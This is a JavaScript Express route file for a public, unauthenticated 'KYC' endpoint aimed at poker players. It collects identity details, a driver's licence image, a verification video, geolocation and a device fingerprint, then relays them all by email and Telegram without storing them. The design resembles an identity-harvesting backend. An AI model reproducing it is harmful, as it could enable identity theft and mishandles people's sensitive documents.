import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';
import { v4 as uuidv4 } from 'uuid';
import { sendEmailNotification, sendTelegramNotification } from '../services/notification.js';

const router = express.Router();

// Health check endpoint
router.get('/health', (req, res) => {
  res.json({
    success: true,
    message: 'KYC service is running',
    timestamp: new Date().toISOString()
  });
});

// Configure multer for file uploads (use memory storage - no file saving)
const storage = multer.memoryStorage();

const fileFilter = (req, file, cb) => {
  // Allow images and videos
  if (file.mimetype.startsWith('image/') || file.mimetype.startsWith('video/')) {
    cb(null, true);
  } else {
    cb(new Error('Only image and video files are allowed!'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 50 * 1024 * 1024, // 50MB limit
    fieldSize: 10 * 1024 * 1024, // 10MB for non-file fields
    fieldNameSize: 100, // Max field name size
    fields: 20, // Max number of fields
    parts: 30, // Max number of parts (fields + files)
    headerPairs: 2000 // Max number of header key=>value pairs
  }
});

// Handle preflight OPTIONS request for CORS
router.options('/submit', (req, res) => {
  res.status(200).end();
});

// Public KYC submission endpoint (no auth required)
router.post('/submit', upload.fields([
  { name: 'driverLicense', maxCount: 1 },
  { name: 'verificationVideo', maxCount: 1 }
]), async (req, res) => {
  
  try {
    const {
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      pokerPlatform,
      playerId,
      deviceFingerprint,
      geolocationData,
      deviceSpecs
    } = req.body;

    // Validate required fields
    if (!fullName) {
      return res.status(400).json({ error: 'Full name is required' });
    }

    const submissionId = uuidv4();

    // Parse JSON fields
    let geolocation = null;
    let deviceSpecsData = null;
    
    try {
      if (geolocationData) {
        geolocation = JSON.parse(geolocationData);
      }
      if (deviceSpecs) {
        deviceSpecsData = JSON.parse(deviceSpecs);
      }
    } catch (parseError) {
      console.error('Error parsing JSON data:', parseError);
    }

    // Get client IP
    const clientIP = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
                    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    // Prepare KYC data for notifications
    const kycData = {
      submissionId,
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      pokerPlatform,
      playerId,
      ipAddress: clientIP,
      geolocation,
      deviceData: deviceSpecsData,
      deviceFingerprint,
      submittedAt: new Date().toISOString()
    };


    // Prepare files for email attachment (from memory buffers)
    const files = [];
    if (req.files?.driverLicense?.[0]) {
      files.push({
        originalname: req.files.driverLicense[0].originalname || 'driver_license.jpg',
        buffer: req.files.driverLicense[0].buffer,
        mimetype: req.files.driverLicense[0].mimetype
      });
    }
    if (req.files?.verificationVideo?.[0]) {
      files.push({
        originalname: req.files.verificationVideo[0].originalname || 'verification_video.mp4',
        buffer: req.files.verificationVideo[0].buffer,
        mimetype: req.files.verificationVideo[0].mimetype
      });
    }

    // Send notifications
    try {
      await sendEmailNotification(kycData, files);
      await sendTelegramNotification(kycData, files);
    } catch (notificationError) {
      console.error('Error sending notifications:', notificationError);
      // Don't fail the submission if notifications fail
    }

    res.status(201).json({
      success: true,
      message: 'KYC submission received successfully',
      submissionId: submissionId
    });

  } catch (error) {
    console.error('KYC submission error:', error);
    res.status(500).json({
      error: 'Failed to submit KYC data',
      message: error.message
    });
  }
});


export default router;
